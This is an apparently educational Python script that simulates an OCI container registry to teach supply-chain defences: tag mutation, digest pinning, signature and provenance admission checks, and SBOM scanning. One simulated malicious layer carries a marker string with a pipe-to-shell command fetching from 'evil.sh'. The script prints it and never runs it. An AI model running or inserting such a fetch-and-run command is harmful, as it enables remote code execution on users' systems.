#!/usr/bin/env python3
"""A miniature OCI registry, plus the trust machinery that has to sit around it.

Lesson: phases/10-infrastructure-and-deployment/04-registries-and-supply-chain/docs/en.md
Specs:  OCI Image Format Specification v1.1 (descriptors, image manifest, image index)
        OCI Distribution Specification v1.1 (blob/manifest endpoints, pull-by-digest)
Real here: sha256 content addressing, blob dedup, tag mutation, digest verification.
Modelled here: HMAC stands in for asymmetric signing (real world: Sigstore/cosign),
and the vulnerability feed is a synthetic five-row table, not a real CVE database.
Stdlib only. Deterministic: SHAKE-256 content, fixed keys, random.Random(7).
"""

from __future__ import annotations

import hashlib
import hmac
import json
import os
import random
import shutil
import tempfile
import time
from typing import Any, Dict, List, Optional, Tuple

MIB = 1024 * 1024
T0 = time.perf_counter()
RNG = random.Random(7)

REPO = "registry.internal/app"


# --------------------------------------------------------------------------
# helpers
# --------------------------------------------------------------------------

def synth(label: str, size: int) -> bytes:
    """Deterministic blob content. SHAKE-256 is an extendable-output function:
    the same label yields the same bytes, every run, on every machine."""
    return hashlib.shake_256(label.encode()).digest(size)


def digest_of(data: bytes) -> str:
    return "sha256:" + hashlib.sha256(data).hexdigest()


def canonical(obj: Any) -> bytes:
    """A manifest's digest is the digest of its exact bytes, so the encoding has
    to be stable. Sorted keys, no whitespace."""
    return json.dumps(obj, sort_keys=True, separators=(",", ":")).encode()


def short(d: str) -> str:
    return d[:19]


def mib(n: int) -> str:
    return "%.1f MiB" % (n / MIB)


class DigestMismatch(Exception):
    def __init__(self, expected: str, actual: str) -> None:
        super().__init__("digest mismatch")
        self.expected = expected
        self.actual = actual


class BlobMissing(Exception):
    pass


# --------------------------------------------------------------------------
# the registry
# --------------------------------------------------------------------------

class BlobStore:
    """Content-addressable storage. The key IS the sha256 of the value, so an
    identical layer pushed by a hundred different images is stored once."""

    def __init__(self, root: str) -> None:
        self.dir = os.path.join(root, "blobs", "sha256")
        os.makedirs(self.dir, exist_ok=True)
        self.puts = 0
        self.dedup_hits = 0

    def _path(self, digest: str) -> str:
        return os.path.join(self.dir, digest.split(":", 1)[1])

    def put(self, data: bytes) -> str:
        digest = digest_of(data)
        path = self._path(digest)
        self.puts += 1
        if os.path.exists(path):
            self.dedup_hits += 1          # already here: the push uploads nothing
            return digest
        with open(path, "wb") as fh:
            fh.write(data)
        return digest

    def get(self, digest: str, verify: bool = True) -> bytes:
        path = self._path(digest)
        if not os.path.exists(path):
            raise BlobMissing(digest)
        with open(path, "rb") as fh:
            data = fh.read()
        if verify:                        # the client recomputes; this is the point
            actual = digest_of(data)
            if not hmac.compare_digest(actual, digest):
                raise DigestMismatch(digest, actual)
        return data

    def delete(self, digest: str) -> None:
        os.remove(self._path(digest))

    def stored_bytes(self) -> int:
        return sum(os.path.getsize(os.path.join(self.dir, n))
                   for n in os.listdir(self.dir))

    def count(self) -> int:
        return len(os.listdir(self.dir))


class Registry:
    def __init__(self, root: str) -> None:
        self.blobs = BlobStore(root)
        self.tags: Dict[Tuple[str, str], str] = {}   # (repo, tag) -> manifest digest
        self.signatures: Dict[str, Tuple[str, str]] = {}   # digest -> (key_id, mac)
        self.attestations: Dict[str, Dict[str, Any]] = {}  # digest -> provenance

    # ---- push -----------------------------------------------------------
    def push_manifest(self, repo: str, tag: Optional[str],
                      layers: List[Tuple[str, bytes]],
                      config: Dict[str, Any]) -> str:
        descs = []
        for name, data in layers:
            descs.append({
                "mediaType": "application/vnd.oci.image.layer.v1.tar+gzip",
                "digest": self.blobs.put(data),
                "size": len(data),
                "annotations": {"layer.name": name},
            })
        cfg_bytes = canonical(config)
        manifest = {
            "schemaVersion": 2,
            "mediaType": "application/vnd.oci.image.manifest.v1+json",
            "config": {"mediaType": "application/vnd.oci.image.config.v1+json",
                       "digest": self.blobs.put(cfg_bytes), "size": len(cfg_bytes)},
            "layers": descs,
        }
        man_bytes = canonical(manifest)
        man_digest = self.blobs.put(man_bytes)   # manifests are blobs too
        if tag is not None:
            self.tags[(repo, tag)] = man_digest  # a tag is just a mutable pointer
        return man_digest

    def push_index(self, repo: str, tag: str,
                   members: List[Tuple[str, str, str]]) -> str:
        """An image index (a 'manifest list'): one tag, one manifest per platform."""
        index = {
            "schemaVersion": 2,
            "mediaType": "application/vnd.oci.image.index.v1+json",
            "manifests": [
                {"mediaType": "application/vnd.oci.image.manifest.v1+json",
                 "digest": d, "size": len(self.blobs.get(d)),
                 "platform": {"os": osname, "architecture": arch}}
                for d, osname, arch in members
            ],
        }
        idx_bytes = canonical(index)
        idx_digest = self.blobs.put(idx_bytes)
        self.tags[(repo, tag)] = idx_digest
        return idx_digest

    def retag(self, repo: str, tag: str, man_digest: str) -> None:
        """Re-point an existing tag. No special permission, no audit trail, no
        new digest. This one line is the whole attack in section 3."""
        self.tags[(repo, tag)] = man_digest

    # ---- pull -----------------------------------------------------------
    def resolve(self, ref: str) -> Tuple[str, str]:
        if "@" in ref:
            repo, digest = ref.split("@", 1)
            return repo, digest                    # trust once: the ref IS the content
        repo, tag = ref.rsplit(":", 1)
        key = (repo, tag)
        if key not in self.tags:
            raise BlobMissing(ref)
        return repo, self.tags[key]                # trust on every pull: ask the server

    def pull(self, ref: str, platform: str = "linux/amd64",
             verify: bool = True) -> Dict[str, Any]:
        repo, root_digest = self.resolve(ref)
        doc = json.loads(self.blobs.get(root_digest, verify))
        steps = ["%s -> %s" % (ref.split("/")[-1], short(root_digest))]
        man_digest = root_digest
        if doc["mediaType"].endswith("index.v1+json"):
            want_os, want_arch = platform.split("/")
            picked = None
            for m in doc["manifests"]:
                if (m["platform"]["os"], m["platform"]["architecture"]) == (want_os, want_arch):
                    picked = m
                    break
            if picked is None:
                raise BlobMissing("no manifest for " + platform)
            man_digest = picked["digest"]
            steps.append("index[%s] -> %s" % (platform, short(man_digest)))
            doc = json.loads(self.blobs.get(man_digest, verify))
        cfg = json.loads(self.blobs.get(doc["config"]["digest"], verify))
        layers = [(d["annotations"]["layer.name"], d["digest"],
                   self.blobs.get(d["digest"], verify)) for d in doc["layers"]]
        return {"repo": repo, "manifest_digest": man_digest, "manifest": doc,
                "config": cfg, "layers": layers, "steps": steps}


# --------------------------------------------------------------------------
# image contents
# --------------------------------------------------------------------------

def code_layer(marker: str, size: int) -> bytes:
    """An app-code layer whose first line is human-readable, so a 'pull' can
    print what it actually received."""
    head = marker.encode()
    return head + synth("code:" + marker, size - len(head))


BASE_AMD64 = ("debian-bookworm-slim", synth("base:amd64", 29 * MIB + 300 * 1024))
PY_AMD64 = ("python-3.12.4-runtime", synth("python:amd64", 41 * MIB + 700 * 1024))
DEPS_V1 = ("site-packages@2024-03", synth("deps:v1", 12 * MIB + 100 * 1024))
DEPS_V2 = ("site-packages@2024-07", synth("deps:v2", 12 * MIB + 620 * 1024))
BASE_ARM64 = ("debian-bookworm-slim", synth("base:arm64", 30 * MIB + 120 * 1024))
PY_ARM64 = ("python-3.12.4-runtime", synth("python:arm64", 42 * MIB + 900 * 1024))

CODE_10 = ("app-code", code_layer("# app 1.0  build 8f21c4  (clean)\n", 409_600))
CODE_11 = ("app-code", code_layer("# app 1.1  build a37e90  (clean)\n", 421_888))
CODE_EVIL = ("app-code", code_layer(
    "# app 1.0  build 8f21c4  + os.system('curl evil.sh|sh')\n", 411_648))


def config_for(version: str, arch: str = "amd64") -> Dict[str, Any]:
    return {"architecture": arch, "os": "linux",
            "config": {"Entrypoint": ["/usr/bin/python3", "/srv/app/main.py"],
                       "Env": ["APP_VERSION=" + version]},
            "created": "2026-03-01T00:00:00Z"}


# --------------------------------------------------------------------------
# 1 · content-addressed storage, manifest resolution, dedup
# --------------------------------------------------------------------------

def section1(reg: Registry) -> Dict[str, Any]:
    print("== 1 · CONTENT-ADDRESSED STORAGE: TAG -> MANIFEST -> CONFIG + LAYERS ==")
    d10 = reg.push_manifest(REPO, "1.0",
                            [BASE_AMD64, PY_AMD64, DEPS_V1, CODE_10],
                            config_for("1.0"))
    got = reg.pull(REPO + ":1.0")
    print("  pull %s:1.0" % REPO)
    print("    1 · resolve tag     %-24s -> %s" % ("app:1.0", short(d10)))
    print("    2 · fetch manifest  %-24s -> %d bytes, %d layers"
          % (short(d10), len(canonical(got["manifest"])), len(got["layers"])))
    print("    3 · fetch config    %-24s -> APP_VERSION=%s"
          % (short(got["manifest"]["config"]["digest"]),
             got["config"]["config"]["Env"][0].split("=")[1]))
    print("    4 · fetch layers, each verified against its own digest:")
    logical_10 = 0
    for name, dig, data in got["layers"]:
        logical_10 += len(data)
        print("         %-24s %s  %9s" % (name, short(dig), mib(len(data))))
    print("       image app:1.0 = %s across %d layers"
          % (mib(logical_10), len(got["layers"])))

    stored_after_10 = reg.blobs.stored_bytes()
    d11 = reg.push_manifest(REPO, "1.1",
                            [BASE_AMD64, PY_AMD64, DEPS_V2, CODE_11],
                            config_for("1.1"))
    got11 = reg.pull(REPO + ":1.1")
    logical_11 = sum(len(d) for _, _, d in got11["layers"])
    stored_after_11 = reg.blobs.stored_bytes()
    uploaded = stored_after_11 - stored_after_10
    print()
    print("  push app:1.1 — 2 of 4 layers are byte-identical to app:1.0")
    print("    image app:1.1 logical size          %10s" % mib(logical_11))
    print("    blobs actually uploaded             %10s   (%d of 4 layers were new)"
          % (mib(uploaded), sum(1 for n, d, b in got11["layers"]
                                if b not in (BASE_AMD64[1], PY_AMD64[1]))))
    refs: Dict[str, int] = {}
    for got_i in (got, got11):
        for name, dig, data in got_i["layers"]:
            refs[dig] = refs.get(dig, 0) + 1
    print("    the layer blobs now in the store, keyed by sha256(content):")
    seen = set()
    for got_i, tagname in ((got, "1.0"), (got11, "1.1")):
        for name, dig, data in got_i["layers"]:
            if dig in seen:
                continue
            seen.add(dig)
            print("         %s  %-22s %8s   refs %d"
                  % (short(dig), name, mib(len(data)), refs[dig]))
    logical2 = logical_10 + logical_11
    print("    two images, logical bytes           %10s" % mib(logical2))
    print("    two images, bytes on disk           %10s" % mib(stored_after_11))
    print("    saved by content addressing         %10s   (%.0f%%)"
          % (mib(logical2 - stored_after_11),
             100.0 * (logical2 - stored_after_11) / logical2))

    # eight more patch builds: only the app-code layer differs
    total_logical = logical2
    for i in range(2, 10):
        code = ("app-code", code_layer("# app 1.%d build %04x (clean)\n" % (i, 0x1000 + i),
                                       409_600 + i * 512))
        reg.push_manifest(REPO, "1.%d" % i,
                          [BASE_AMD64, PY_AMD64, DEPS_V2, code], config_for("1.%d" % i))
        total_logical += sum(len(b) for _, b in
                             [BASE_AMD64, PY_AMD64, DEPS_V2, code])
    stored_all = reg.blobs.stored_bytes()
    print()
    print("  ...eight more patch builds pushed (1.2 through 1.9), app-code layer only:")
    print("    10 images, logical bytes            %10s" % mib(total_logical))
    print("    10 images, bytes on disk            %10s" % mib(stored_all))
    print("    saved                               %10s   (%.1f%%)"
          % (mib(total_logical - stored_all),
             100.0 * (total_logical - stored_all) / total_logical))
    print("    %d blob puts, %d of them were already present (dedup hits)"
          % (reg.blobs.puts, reg.blobs.dedup_hits))
    print("  a registry is a key-value store keyed by the hash of the value.")
    print("  that is why 10 releases cost %s instead of %s."
          % (mib(stored_all), mib(total_logical)))
    print()
    return {"d10": d10, "d11": d11, "logical2": logical2,
            "stored2": stored_after_11, "logical10": total_logical,
            "stored10": stored_all, "uploaded11": uploaded,
            "saving2_pct": 100.0 * (logical2 - stored_after_11) / logical2,
            "saving10_pct": 100.0 * (total_logical - stored_all) / total_logical}


# --------------------------------------------------------------------------
# 2 · multi-arch: one tag, two sets of bytes, both legitimate
# --------------------------------------------------------------------------

def section2(reg: Registry, s1: Dict[str, Any]) -> Dict[str, Any]:
    print("== 2 · ONE TAG, TWO ARCHITECTURES, TWO DIFFERENT SETS OF BYTES ==")
    before = reg.blobs.stored_bytes()
    d11_arm = reg.push_manifest(REPO, None,
                                [BASE_ARM64, PY_ARM64, DEPS_V2, CODE_11],
                                config_for("1.1", "arm64"))
    idx = reg.push_index(REPO, "1.1",
                         [(s1["d11"], "linux", "amd64"), (d11_arm, "linux", "arm64")])
    after = reg.blobs.stored_bytes()

    amd = reg.pull(REPO + ":1.1", platform="linux/amd64")
    arm = reg.pull(REPO + ":1.1", platform="linux/arm64")
    print("  tag app:1.1 now points at an image INDEX, not an image:")
    print("    app:1.1  ->  %s   (index, 2 platforms)" % short(idx))
    for label, got in (("linux/amd64", amd), ("linux/arm64", arm)):
        print("      %-12s -> %s" % (label, short(got["manifest_digest"])))
    print("    same tag, same pull command, different manifests: %s"
          % (amd["manifest_digest"] != arm["manifest_digest"]))
    shared = [n for n, d, _ in amd["layers"]
              if d in {dd for _, dd, _ in arm["layers"]}]
    print("    layers shared across the two architectures: %s" % ", ".join(shared))
    print("    the arm64 variant added %s to the store: only the base OS and the"
          % mib(after - before))
    print("    interpreter are arch-specific; wheels and app code are not.")
    print("  this is why `latest` on your laptop and `latest` on the cluster can be")
    print("  different bytes with nothing wrong: an index resolves per platform.")
    print("  the digest you pin must therefore be the INDEX digest, not one platform's.")
    print()
    return {"idx": idx, "d11_arm": d11_arm,
            "amd": amd["manifest_digest"], "arm": arm["manifest_digest"]}


# --------------------------------------------------------------------------
# 3 · THE CENTREPIECE: a tag is a mutable pointer somebody else controls
# --------------------------------------------------------------------------

def section3(reg: Registry, s1: Dict[str, Any]) -> Dict[str, Any]:
    print("== 3 · THE MUTABLE TAG: SAME REFERENCE, DIFFERENT BYTES ==")
    ref = REPO + ":1.0"
    first = reg.pull(ref)
    first_code = [b for n, d, b in first["layers"] if n == "app-code"][0]
    print("  Tue 09:14  deploy  %s" % ref)
    print("             manifest  %s" % short(first["manifest_digest"]))
    print("             app-code  %s"
          % short([d for n, d, _ in first["layers"] if n == "app-code"][0]))
    print("             entrypoint reads: %r" % first_code.split(b"\n")[0].decode())

    evil = reg.push_manifest(REPO, None,
                             [BASE_AMD64, PY_AMD64, DEPS_V1, CODE_EVIL],
                             config_for("1.0"))
    reg.retag(REPO, "1.0", evil)          # one write. no new tag. no audit trail.
    print("  Wed 23:47  a build-system credential leaks; someone pushes to the SAME tag")

    second = reg.pull(ref)
    second_code = [b for n, d, b in second["layers"] if n == "app-code"][0]
    print("  Thu 02:03  a node reboots and re-pulls %s" % ref)
    print("             manifest  %s" % short(second["manifest_digest"]))
    print("             app-code  %s"
          % short([d for n, d, _ in second["layers"] if n == "app-code"][0]))
    print("             entrypoint reads: %r" % second_code.split(b"\n")[0].decode())
    print()
    print("  the reference string you typed:  %s   (unchanged)" % ref)
    print("  the bytes you received:")
    print("    Tue 09:14   %s" % first["manifest_digest"])
    print("    Thu 02:03   %s" % second["manifest_digest"])
    print("    identical?  %s" % (first["manifest_digest"] == second["manifest_digest"]))
    print("  three nodes pulling `app:1.0` on three different days now run three")
    print("  different builds, and every one of them reports version 1.0.")
    print()

    pin = "%s@%s" % (REPO, s1["d10"])
    a = reg.pull(pin)
    b = reg.pull(pin)
    a_code = [x for n, d, x in a["layers"] if n == "app-code"][0]
    print("  the same two pulls, pinned by digest:")
    print("    %s" % pin)
    print("    Tue 09:14   %s" % a["manifest_digest"])
    print("    Thu 02:03   %s" % b["manifest_digest"])
    print("    identical?  %s" % (a["manifest_digest"] == b["manifest_digest"]))
    print("    entrypoint reads: %r" % a_code.split(b"\n")[0].decode())
    print("  the retag did not touch the pinned pull, because the pin does not ask")
    print("  the registry WHICH manifest — it asks for THAT one, by content.")

    # and when the pinned content is gone, a pin fails loudly
    reg.blobs.delete(s1["d10"])
    try:
        reg.pull(pin)
        outcome = "quietly returned other content"
    except BlobMissing:
        outcome = "MANIFEST_UNKNOWN, and the deploy fails"
    print("  a lifecycle policy then garbage-collects that manifest. The same pin:")
    print("    %s" % outcome)
    print("  a pin either returns the exact bytes or nothing. It never silently")
    print("  resolves to something else — the pinned path fails closed by design.")
    print()
    return {"first": first["manifest_digest"], "second": second["manifest_digest"],
            "evil": evil}


# --------------------------------------------------------------------------
# 4 · digest verification catches tampering at rest
# --------------------------------------------------------------------------

def section4(reg: Registry, s1: Dict[str, Any]) -> Dict[str, Any]:
    print("== 4 · DIGEST VERIFICATION: ONE FLIPPED BIT, DETECTED ON PULL ==")
    target = [d for n, d, _ in reg.pull(REPO + ":1.1")["layers"] if n == "app-code"][0]
    path = reg.blobs._path(target)
    original = reg.blobs.get(target)
    offset = RNG.randrange(len(original))
    corrupt = bytearray(original)
    corrupt[offset] ^= 0x01               # flip the low bit of one byte
    with open(path, "wb") as fh:
        fh.write(bytes(corrupt))
    print("  the app-code blob of app:1.1 is %s (%d bytes)."
          % (short(target), len(original)))
    print("  a bit flips at byte %d — bad disk, a bad mirror, or a hostile one."
          % offset)
    print("    byte %d was 0x%02x, is now 0x%02x  (%d of %d bytes differ)"
          % (offset, original[offset], corrupt[offset],
             sum(1 for x, y in zip(original, corrupt) if x != y), len(original)))
    print()
    print("  pull WITHOUT verification:")
    got = reg.blobs.get(target, verify=False)
    print("    returned %d bytes, no error raised. This layer would now execute."
          % len(got))
    print("  pull WITH verification (recompute sha256 over what arrived):")
    try:
        reg.blobs.get(target, verify=True)
        print("    accepted — which would be a bug")
    except DigestMismatch as exc:
        print("    expected  %s" % exc.expected)
        print("    actual    %s" % exc.actual)
        print("    REJECTED. 1 bit in %d bytes changed %d of 64 hex digits."
              % (len(original),
                 sum(1 for x, y in zip(exc.expected[7:], exc.actual[7:]) if x != y)))
    with open(path, "wb") as fh:          # put it back
        fh.write(original)
    print("  content addressing is not a caching trick with a security side effect.")
    print("  it is an integrity check that happens to make caching free.")
    print()
    return {"offset": offset}


# --------------------------------------------------------------------------
# 5 · signing, attestation, and an admission gate
# --------------------------------------------------------------------------

RELEASE_KEY = b"release-key-2026-q1"
ROTATED_KEY = b"release-key-2025-q4"     # revoked; no longer in the trust policy
TRUSTED_KEYS = {"release-2026-q1": RELEASE_KEY}
ALLOWED_SOURCES = {"github.com/acme/app"}
TRUSTED_BUILDERS = {"acme-ci/hosted-runner-v3"}


def sign(digest: str, key: bytes) -> str:
    """Modelled. Real systems sign with a private key nobody can verify with, and
    Sigstore's keyless flow binds a short-lived cert to an OIDC identity instead."""
    return hmac.new(key, digest.encode(), hashlib.sha256).hexdigest()


def verify_sig(digest: str, key_id: str, mac: str) -> bool:
    key = TRUSTED_KEYS.get(key_id)
    if key is None:
        return False
    return hmac.compare_digest(sign(digest, key), mac)   # constant time


def admit(reg: Registry, ref: str) -> Tuple[bool, List[str]]:
    reasons: List[str] = []
    if "@sha256:" not in ref:
        reasons.append("not pinned by digest")
    try:
        _, digest = reg.resolve(ref)
    except BlobMissing:
        return False, reasons + ["reference does not resolve"]
    sig = reg.signatures.get(digest)
    if sig is None:
        reasons.append("no signature")
    elif not verify_sig(digest, sig[0], sig[1]):
        reasons.append("signature not from a trusted key (%s)" % sig[0])
    att = reg.attestations.get(digest)
    if att is None:
        reasons.append("no provenance attestation")
    else:
        if att["source_repo"] not in ALLOWED_SOURCES:
            reasons.append("source repo %s not allowed" % att["source_repo"])
        if att["builder"] not in TRUSTED_BUILDERS:
            reasons.append("builder %s not trusted" % att["builder"])
    return (not reasons), reasons


def section5(reg: Registry, s1: Dict[str, Any], s2: Dict[str, Any],
             s3: Dict[str, Any]) -> Dict[str, Any]:
    print("== 5 · SIGNING, PROVENANCE AND AN ADMISSION GATE ==")
    good = s2["idx"]                     # sign the index digest: what you deploy
    mac = sign(good, RELEASE_KEY)
    reg.signatures[good] = ("release-2026-q1", mac)
    reg.attestations[good] = {"source_repo": "github.com/acme/app",
                              "source_commit": "a37e90c", "builder":
                              "acme-ci/hosted-runner-v3", "slsa_build_level": 3}
    print("  the pipeline signs the digest it just produced, not the tag:")
    print("    subject   %s" % good)
    print("    key id    release-2026-q1")
    print("    signature %s" % mac)
    print("    verify    %s" % verify_sig(good, "release-2026-q1", mac))
    print()
    print("  a signature is a statement ABOUT A DIGEST. Move it to another digest:")
    transplant = verify_sig(s3["evil"], "release-2026-q1", mac)
    print("    same signature, subject %s" % short(s3["evil"]))
    print("    verify    %s   <- the digest is part of what was signed" % transplant)
    forged = sign(good, ROTATED_KEY)
    print("  signed with a key that was rotated out of the trust policy:")
    print("    verify    %s   <- valid HMAC, untrusted key. Both checks matter."
          % verify_sig(good, "release-2025-q4", forged))
    print()

    # a second repo: signed, but built from a fork on someone's laptop
    scraper_repo = "registry.internal/scraper"
    d_scraper = reg.push_manifest(scraper_repo, "2.4",
                                  [BASE_AMD64, PY_AMD64, DEPS_V2,
                                   ("app-code", code_layer("# scraper 2.4\n", 204_800))],
                                  config_for("2.4"))
    reg.signatures[d_scraper] = ("release-2026-q1", sign(d_scraper, RELEASE_KEY))
    reg.attestations[d_scraper] = {"source_repo": "github.com/dev-personal/app-fork",
                                   "source_commit": "local", "builder": "laptop/docker",
                                   "slsa_build_level": 0}
    reg.signatures[s1["d11"]] = ("release-2025-q4", sign(s1["d11"], ROTATED_KEY))
    reg.attestations[s1["d11"]] = {"source_repo": "github.com/acme/app",
                                   "source_commit": "a37e90c",
                                   "builder": "acme-ci/hosted-runner-v3",
                                   "slsa_build_level": 3}

    candidates = [
        REPO + ":latest",
        REPO + ":1.1",
        "%s@%s" % (REPO, good),
        "%s@%s" % (REPO, s3["evil"]),
        "%s@%s" % (REPO, s1["d11"]),
        "%s@%s" % (scraper_repo, d_scraper),
    ]
    reg.tags[(REPO, "latest")] = s3["evil"]
    print("  the deploy gate, run at admission time on every image in the manifest:")
    print("    require: pinned by digest AND signature from a trusted key AND")
    print("             provenance naming an allowed source repo and a trusted builder")
    print()
    allowed = 0
    for ref in candidates:
        ok, why = admit(reg, ref)
        allowed += ok
        display = ref if len(ref) <= 46 else ref[:43] + "..."
        print(("    %-5s %-47s %s" % ("ALLOW" if ok else "DENY", display,
                                      "" if ok else "; ".join(why))).rstrip())
    print()
    print("  %d of %d candidates admitted." % (allowed, len(candidates)))
    print("  note candidate 2: app:1.1 IS the good image and IS signed — denied only")
    print("  because it was requested by tag. The gate cannot verify a pointer.")
    print()
    return {"allowed": allowed, "total": len(candidates), "good": good}


# --------------------------------------------------------------------------
# 6 · SBOM and what a scanner does with it
# --------------------------------------------------------------------------

SBOM_10 = [
    ("openssl", "3.0.13", "deb", True), ("zlib1g", "1.2.13", "deb", False),
    ("libexpat1", "2.5.0", "deb", False), ("perl-base", "5.36.0", "deb", False),
    ("python3", "3.12.4", "deb", True), ("requests", "2.31.0", "pypi", True),
    ("urllib3", "2.0.7", "pypi", True), ("certifi", "2024.2.2", "pypi", True),
    ("idna", "3.6", "pypi", True), ("charset-normalizer", "3.3.2", "pypi", True),
    ("pydantic", "2.6.4", "pypi", True), ("pydantic-core", "2.16.3", "pypi", True),
    ("sqlalchemy", "2.0.29", "pypi", True), ("python-dateutil", "2.8.2", "pypi", False),
]
SBOM_11 = [
    ("openssl", "3.0.14", "deb", True), ("zlib1g", "1.2.13", "deb", False),
    ("libexpat1", "2.6.2", "deb", False), ("perl-base", "5.36.0", "deb", False),
    ("python3", "3.12.4", "deb", True), ("requests", "2.32.3", "pypi", True),
    ("urllib3", "2.2.3", "pypi", True), ("certifi", "2024.7.4", "pypi", True),
    ("idna", "3.7", "pypi", True), ("charset-normalizer", "3.3.2", "pypi", True),
    ("pydantic", "2.7.1", "pypi", True), ("pydantic-core", "2.18.2", "pypi", True),
    ("sqlalchemy", "2.0.29", "pypi", True), ("httpx", "0.27.0", "pypi", True),
    ("httpcore", "1.0.5", "pypi", True), ("h11", "0.14.0", "pypi", True),
    ("anyio", "4.3.0", "pypi", True), ("sniffio", "1.3.1", "pypi", True),
]

# SYNTHETIC advisory feed. Five rows, invented for this lesson. A real feed is
# the NVD / OSV database and has hundreds of thousands of rows.
ADVISORIES = [
    ("ADV-2026-0101", "openssl", "3.0.14", "HIGH"),
    ("ADV-2026-0107", "urllib3", "2.2.2", "HIGH"),
    ("ADV-2026-0112", "libexpat1", "2.6.0", "MEDIUM"),
    ("ADV-2026-0119", "perl-base", None, "MEDIUM"),        # None = no fix exists
    ("ADV-2026-0124", "python-dateutil", "2.9.0", "LOW"),
]


def vparts(v: str) -> Tuple[int, ...]:
    return tuple(int(x) for x in v.replace("-", ".").split(".") if x.isdigit())


def scan(sbom: List[Tuple[str, str, str, bool]]) -> List[Tuple[str, str, str, str, bool]]:
    out = []
    for adv_id, pkg, fixed_in, sev in ADVISORIES:
        for name, ver, _kind, reachable in sbom:
            if name != pkg:
                continue
            if fixed_in is None or vparts(ver) < vparts(fixed_in):
                out.append((adv_id, pkg, ver, sev, reachable))
    return out


def section6() -> Dict[str, Any]:
    print("== 6 · SBOM: WHAT CHANGED BETWEEN TWO BUILDS, AND WHAT A SCANNER SEES ==")
    a = {n: v for n, v, _k, _r in SBOM_10}
    b = {n: v for n, v, _k, _r in SBOM_11}
    added = sorted(set(b) - set(a))
    removed = sorted(set(a) - set(b))
    changed = sorted(n for n in set(a) & set(b) if a[n] != b[n])
    same = sorted(n for n in set(a) & set(b) if a[n] == b[n])
    print("  app:1.0  %d components      app:1.1  %d components"
          % (len(SBOM_10), len(SBOM_11)))
    print("  diff: %d added, %d removed, %d upgraded, %d unchanged"
          % (len(added), len(removed), len(changed), len(same)))
    for n in changed:
        print("    ~ %-20s %-10s -> %s" % (n, a[n], b[n]))
    for n in added:
        print("    + %-20s %s" % (n, b[n]))
    for n in removed:
        print("    - %-20s %s" % (n, a[n]))
    print("  the diff is the release note nobody writes: 'we also upgraded openssl")
    print("  and pulled in 5 new transitive packages'.")
    print()
    f10, f11 = scan(SBOM_10), scan(SBOM_11)
    print("  scanned against a SYNTHETIC 5-row advisory feed (a real one is OSV/NVD):")
    for label, findings in (("app:1.0", f10), ("app:1.1", f11)):
        print("    %s  %d finding%s, %d in a package this image actually loads"
              % (label, len(findings), "" if len(findings) == 1 else "s",
                 sum(1 for f in findings if f[4])))
        for adv, pkg, ver, sev, reach in findings:
            print("       %-14s %-16s %-9s %-7s %s"
                  % (adv, pkg, ver, sev,
                     "REACHABLE" if reach else "present, never loaded"))
    print("  every remaining app:1.1 finding is in a package the app never imports.")
    print("  a scanner cannot tell: it reads the SBOM, not the call graph. And the")
    print("  one that is left has fixed_in = none — no upstream fix exists, so")
    print("  'zero criticals' is reachable only by choosing what to count.")
    print()
    return {"added": len(added), "removed": len(removed), "changed": len(changed),
            "same": len(same), "f10": len(f10), "f11": len(f11),
            "r10": sum(1 for f in f10 if f[4]), "r11": sum(1 for f in f11 if f[4])}


# --------------------------------------------------------------------------

def main() -> None:
    root = tempfile.mkdtemp(prefix="mini-registry-")
    try:
        reg = Registry(root)
        s1 = section1(reg)
        s2 = section2(reg, s1)
        s3 = section3(reg, s1)
        section4(reg, s1)
        section5(reg, s1, s2, s3)
        section6()
        print("  (total wall time %.1f s, %d blobs, %s on disk)"
              % (time.perf_counter() - T0, reg.blobs.count(),
                 mib(reg.blobs.stored_bytes())))
    finally:
        shutil.rmtree(root, ignore_errors=True)


if __name__ == "__main__":
    main()
